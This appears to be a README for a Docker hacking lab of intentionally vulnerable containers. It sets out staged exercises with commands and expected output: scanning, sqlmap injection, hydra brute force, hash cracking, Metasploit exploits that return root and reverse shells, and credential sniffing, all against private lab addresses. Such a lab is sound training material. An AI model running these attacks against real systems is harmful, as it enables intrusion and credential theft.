# Docker Lab

A lightweight hacking lab using Docker containers as intentionally vulnerable targets. No VMs needed — runs entirely on your Kali machine.

> **Legal Notice:** This lab is for educational purposes only. Only attack systems you own or have explicit permission to test.

---

## Girus Warm-Up Labs

Before attacking, build your Linux and Docker fluency with guided Girus exercises.

| Exercise | Girus Lab ID | Maps To |
|----------|-------------|---------|
| WU-1 | `linux-comandos-basicos` | CLI fluency, pipes, redirection |
| WU-2 | `linux-permissoes-arquivos` | chmod, SUID/SGID, file permissions |
| WU-3 | `linux-gerenciamento-processos` | ps, kill, signals, background jobs |
| WU-4 | `linux-monitoramento-sistema` | ss, netstat, journalctl — recon prereqs |
| WU-5 | `docker-fundamentos` | docker run, ps, stop, rm |
| WU-6 | `docker-gerenciamento-containers` | exec, logs, inspect — managing lab containers |

```bash
# Launch any warm-up exercise
girus lab start linux-comandos-basicos
girus lab start docker-fundamentos

# Open Girus UI
xdg-open http://localhost:8000
```

See [`girus-warmups.md`](./girus-warmups.md) for full step-by-step instructions.

---

## Architecture

```
┌─────────────────────────────────────────────────┐
│              Docker Network: kali-lab            │
│               Subnet: 172.20.0.0/24              │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  DVWA    │  │  WebGoat │  │ Metasploitable│  │
│  │172.20.0.20│  │172.20.0.30│  │ 172.20.0.40  │  │
│  │Port 80   │  │Port 8080 │  │ Many ports   │  │
│  └──────────┘  └──────────┘  └──────────────┘  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │  SSH     │  │  FTP     │  │  MySQL       │  │
│  │172.20.0.50│  │172.20.0.60│  │ 172.20.0.70  │  │
│  │Port 22   │  │Port 21   │  │ Port 3306    │  │
│  └──────────┘  └──────────┘  └──────────────┘  │
└─────────────────────────────────────────────────┘
         ↑ Attacker connects from host Kali
```

---

## Quick Start

```bash
# Start the entire lab
./lab.sh start

# Check lab status
./lab.sh status

# Stop all containers
./lab.sh stop

# Attack from isolated Kali container
./kali-attacker.sh

# Set up wordlists
sudo ./setup-wordlists.sh
```

**Expected output after `./lab.sh start`:**
```
Starting kali-lab network...
Starting dvwa          ... done
Starting webgoat       ... done
Starting metasploitable ... done
Starting ssh-target    ... done
Starting ftp-target    ... done
Starting mysql-target  ... done
Lab is up. Happy hacking.
```

**Expected output after `./lab.sh status`:**
```
CONTAINER           STATUS          PORTS
dvwa                Up X minutes    0.0.0.0:80->80/tcp
webgoat             Up X minutes    0.0.0.0:8080->8080/tcp
metasploitable      Up X minutes    0.0.0.0:8180->8180/tcp
ssh-target          Up X minutes    0.0.0.0:2222->22/tcp
ftp-target          Up X minutes    0.0.0.0:21->21/tcp
mysql-target        Up X minutes    0.0.0.0:3306->3306/tcp
```

---

## Lab Targets

| Container | IP | Ports | Vulnerabilities |
|-----------|-----|-------|----------------|
| DVWA | 172.20.0.20 | 80 | SQLi, XSS, CSRF, File Upload, Command Injection |
| WebGoat | 172.20.0.30 | 8080 | OWASP Top 10 interactive lessons |
| Metasploitable2 | 172.20.0.40 | many | vsftpd backdoor, Samba, UnrealIRCd, Tomcat |
| SSH target | 172.20.0.50 | 22 | Weak credentials (for brute force practice) |
| FTP target | 172.20.0.60 | 21 | Anonymous login, vsftpd |
| MySQL | 172.20.0.70 | 3306 | No-auth root access |

---

## Lab Exercises by Study Plan Month

---

### Month 1–2: Information Gathering

```bash
# Scan the entire lab network
nmap -sV -sC 172.20.0.0/24

# Enumerate DVWA
nmap -A 172.20.0.20

# Web directory brute force
gobuster dir -u http://172.20.0.20 -w /usr/share/wordlists/dirb/common.txt

# Subdomain/vhost discovery
ffuf -u http://172.20.0.20/FUZZ -w /usr/share/wordlists/dirb/big.txt
```

**Expected output — `nmap -sV -sC 172.20.0.0/24`:**
```
Nmap scan report for 172.20.0.20
Host is up (0.00028s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
| http-title: DVWA - Damn Vulnerable Web Application

Nmap scan report for 172.20.0.40
Host is up (0.00031s latency).
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1
80/tcp   open  http        Apache httpd 2.2.8
139/tcp  open  netbios-ssn Samba smbd 3.X
445/tcp  open  netbios-ssn Samba smbd 3.X
3306/tcp open  mysql       MySQL 5.0.51a
8180/tcp open  http        Apache Tomcat/Coyote JSP engine
```

**Expected output — `gobuster dir`:**
```
===============================================================
Gobuster v3.x
===============================================================
/index.php            (Status: 200) [Size: 1516]
/login.php            (Status: 200) [Size: 1532]
/logout.php           (Status: 302) [Size: 0]
/setup.php            (Status: 200) [Size: 3549]
/config               (Status: 301) [Size: 315]
/dvwa                 (Status: 301) [Size: 313]
===============================================================
```

**Validation checklist — Month 1–2:**
- [ ] `nmap` discovers all 6 lab containers on `172.20.0.0/24`
- [ ] Metasploitable2 shows vsftpd 2.3.4, Samba, Tomcat 8180 in scan results
- [ ] `gobuster` finds `/login.php` and `/dvwa/` on DVWA
- [ ] `ffuf` returns at least 5 valid paths

**Common errors:**

| Error | Cause | Fix |
|-------|-------|-----|
| `nmap: no route to host` | Lab not running or wrong subnet | Run `./lab.sh start` and verify subnet with `docker network inspect kali-lab` |
| `gobuster` finds nothing | Wordlist path wrong | Run `sudo ./setup-wordlists.sh` or use `-w /usr/share/wordlists/dirb/common.txt` |
| `ffuf` rate errors | Too many requests | Add `-rate 50` to slow down |
| DVWA returns 403 | Container still initializing | Wait 30 seconds after `./lab.sh start` |

---

### Month 3–4: Web Application Testing

```bash
# DVWA credentials: admin / password
# Set security level to: Low

# SQL Injection
sqlmap -u "http://172.20.0.20/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session>; security=low" --dbs

# Directory brute force on DVWA
gobuster dir -u http://172.20.0.20/dvwa -w /usr/share/wordlists/dirb/common.txt -x php

# Scan with Nikto
nikto -h http://172.20.0.20

# WebGoat OWASP exercises
# Access: http://172.20.0.30:8080/WebGoat
# Register, then work through each lesson
```

**Expected output — `sqlmap --dbs`:**
```
[*] starting @ HH:MM:SS
[INFO] testing connection to the target URL
[INFO] checking if the target is protected by some kind of WAF/IPS
[INFO] testing if the target URL content is stable
[INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
...
available databases [2]:
[*] dvwa
[*] information_schema
```

**Expected output — `nikto`:**
```
- Nikto v2.x
---------------------------------------------------------------------------
+ Target IP:          172.20.0.20
+ Target Hostname:    172.20.0.20
+ Target Port:        80
---------------------------------------------------------------------------
+ Server: Apache/2.4.x
+ /dvwa/config/config.inc.php.bak: DVWA config backup found
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
```

**Validation checklist — Month 3–4:**
- [ ] `sqlmap` identifies `id` parameter as injectable
- [ ] `sqlmap --dbs` returns at least `dvwa` and `information_schema`
- [ ] `nikto` finds missing security headers and backup files
- [ ] WebGoat accessible at `http://172.20.0.30:8080/WebGoat` after registering
- [ ] At least one WebGoat SQL injection lesson completed

**Common errors:**

| Error | Cause | Fix |
|-------|-------|-----|
| `sqlmap` says "not injectable" | Wrong cookie or security level not Low | Log into DVWA, copy fresh `PHPSESSID`, set security to Low in DVWA UI |
| WebGoat page not loading | Container still starting | Wait 60s after lab start; WebGoat is slow to initialize |
| Nikto shows no results | Target not responding | Confirm DVWA is up: `curl -I http://172.20.0.20` |
| `sqlmap` blocked by WAF | DVWA security set to Medium/High | Set DVWA security level to Low under DVWA Security menu |

---

### Month 5: Password Attacks

```bash
# SSH brute force (weak credentials target)
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://172.20.0.50

# FTP brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.20.0.60

# Crack hashes from DVWA MySQL dump
# First dump: sqlmap ... --dump
# Then: hashcat -a 0 -m 0 hashes.txt rockyou.txt

# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://172.20.0.70
```

**Expected output — `hydra` SSH:**
```
Hydra v9.x (c) 2023 by van Hauser/THC & David Maciejak
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries
[DATA] attacking ssh://172.20.0.50:22/
[22][ssh] host: 172.20.0.50   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

**Expected output — `hashcat` (DVWA MD5 hashes):**
```
hashcat (v6.x) starting...
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344385

5f4dcc3b5aa765d61d8327deb882cf99:password
...
Session..........: hashcat
Status...........: Cracked
```

**Validation checklist — Month 5:**
- [ ] `hydra` finds valid SSH credentials on `172.20.0.50`
- [ ] FTP anonymous login confirmed: `ftp 172.20.0.60` → user `anonymous`, blank password
- [ ] `sqlmap --dump` extracts at least one user hash from DVWA `users` table
- [ ] `hashcat` cracks at least one MD5 hash from the dump

**Common errors:**

| Error | Cause | Fix |
|-------|-------|-----|
| `hydra` very slow | rockyou.txt is 14M entries | Use `-t 4` threads; test with a smaller list first (e.g., `/usr/share/wordlists/metasploit/unix_passwords.txt`) |
| rockyou.txt not found | Not extracted | `sudo gunzip /usr/share/wordlists/rockyou.txt.gz` |
| `hydra` SSH connection refused | SSH target not running | `docker ps` to confirm `ssh-target` is up |
| `hashcat` reports "no opencl" | No GPU/OpenCL | Add `--backend-ignore-cuda --backend-ignore-opencl -D 1` to force CPU mode |

---

### Month 7: Exploitation with Metasploit

```bash
# Start msfconsole
msfconsole -q

# vsftpd 2.3.4 backdoor (Metasploitable2)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.20.0.40
run

# Samba usermap_script
use exploit/multi/samba/usermap_script
set RHOSTS 172.20.0.40
run

# Tomcat manager (Metasploitable2, port 8180)
use exploit/multi/http/tomcat_mgr_upload
set RHOSTS 172.20.0.40
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
run
```

**Expected output — vsftpd backdoor:**
```
[*] 172.20.0.40:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 172.20.0.40:21 - USER: 331 Please specify the password.
[+] 172.20.0.40:21 - Backdoor service has been spawned, handling...
[+] 172.20.0.40:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (172.20.0.X:XXXXX -> 172.20.0.40:6200)

id
uid=0(root) gid=0(root) groups=0(root)
```

**Expected output — Samba usermap_script:**
```
[*] Started reverse TCP handler on 172.20.0.X:4444
[*] Command shell session 2 opened (172.20.0.X:4444 -> 172.20.0.40:XXXXX)

id
uid=0(root) gid=0(root) groups=0(root)
```

**Validation checklist — Month 7:**
- [ ] vsftpd backdoor gives a root shell on Metasploitable2
- [ ] Samba usermap_script opens a reverse shell
- [ ] Tomcat exploit uploads a WAR and opens a Meterpreter session
- [ ] `sessions -l` in msfconsole lists at least 2 active sessions

**Common errors:**

| Error | Cause | Fix |
|-------|-------|-----|
| `Exploit completed, but no session created` (vsftpd) | Backdoor already triggered / port 6200 blocked | Reset Metasploitable: `./lab.sh clean && ./lab.sh start`; check `set LHOST` |
| Samba exploit fails | Wrong LHOST (Metasploitable can't reach back) | `set LHOST <your kali-lab bridge IP>` (find with `ip addr show br-XXXXX`) |
| Tomcat returns 401 | Wrong credentials | Default is `tomcat:tomcat`; confirm with browser at `http://172.20.0.40:8180/manager` |
| msfconsole slow to start | Database not running | `msfdb init` then retry |

---

### Month 8: Sniffing

```bash
# Capture all lab traffic
docker network inspect kali-lab
# Note the bridge interface name (br-XXXXX)
tcpdump -i br-XXXXX -w lab_capture.pcap

# Open in Wireshark
wireshark lab_capture.pcap

# Generate interesting traffic first:
# - Do an FTP login to 172.20.0.60
# - Do an HTTP login to DVWA
# Then capture and find credentials in Wireshark
```

**Expected output — `docker network inspect kali-lab` (relevant section):**
```json
"Options": {
    "com.docker.network.bridge.name": "br-a1b2c3d4e5f6"
},
```

**Expected output — `tcpdump`:**
```
tcpdump: listening on br-a1b2c3d4e5f6, link-type EN10MB (Ethernet), snapshot length 262144 bytes
14:32:01.123456 IP 172.20.0.1.54321 > 172.20.0.60.21: Flags [S]...
14:32:01.123789 IP 172.20.0.60.21 > 172.20.0.1.54321: Flags [S.]...
14:32:01.124012 IP 172.20.0.60.21: 220 (vsFTPd 2.3.4)
^C
142 packets captured
```

**Validation checklist — Month 8:**
- [ ] `docker network inspect kali-lab` shows a `br-XXXXX` interface name
- [ ] `tcpdump` starts capturing without errors
- [ ] After generating FTP traffic, Wireshark shows FTP `USER` and `PASS` in plaintext
- [ ] After DVWA HTTP login, Wireshark `Follow TCP Stream` reveals `username=admin&password=password`

**Common errors:**

| Error | Cause | Fix |
|-------|-------|-----|
| `tcpdump: br-XXXXX: No such device` | Wrong interface name | Get exact name: `docker network inspect kali-lab \| grep bridge.name` |
| tcpdump: `Operation not permitted` | Missing capability | Run with `sudo tcpdump ...` |
| Wireshark can't read pcap | File not closed | Stop `tcpdump` with `Ctrl+C` before opening in Wireshark |
| No FTP credentials visible | Capture started after login | Start `tcpdump` first, then do the FTP login |

---

## Files in This Directory

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Defines all lab containers and network |
| `lab.sh` | Lab management: start/stop/status/clean |
| `kali-attacker.sh` | Launch isolated Kali attacker container |
| `setup-wordlists.sh` | Set up wordlists (rockyou, SecLists) |
| `girus-warmups.md` | Step-by-step Girus warm-up exercises |

---

## Prerequisites

```bash
# Docker must be running
sudo systemctl start docker

# Add yourself to docker group (one-time)
sudo usermod -aG docker $USER
# Then log out and back in

# Start the lab
./lab.sh start
```

---

## Resetting the Lab

```bash
# Stop and remove all containers
./lab.sh clean

# Start fresh
./lab.sh start
```

This is useful after exploiting a target and wanting a clean state for a new exercise.

---

## Full Lab Validation Checklist

Run this after `./lab.sh start` to confirm every target is reachable:

```bash
# HTTP targets
curl -o /dev/null -s -w "%{http_code}" http://172.20.0.20       # 200 = DVWA up
curl -o /dev/null -s -w "%{http_code}" http://172.20.0.30:8080  # 200 = WebGoat up

# Network targets
nc -zv 172.20.0.40 21   # Metasploitable FTP
nc -zv 172.20.0.50 22   # SSH target
nc -zv 172.20.0.60 21   # FTP target
nc -zv 172.20.0.70 3306 # MySQL target
```

Expected: all return `open` or HTTP `200`.
